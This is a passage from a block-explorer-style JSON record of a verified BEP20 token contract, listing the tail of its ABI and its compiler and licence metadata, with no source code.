inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BEP20Token", "CompilerVersion": "v0.5.16+commit.9c3226ce", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU LGPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://1b60854a04da47b473ee81f8d371c8f610c2b178b15a5d946baa5e6215312742"}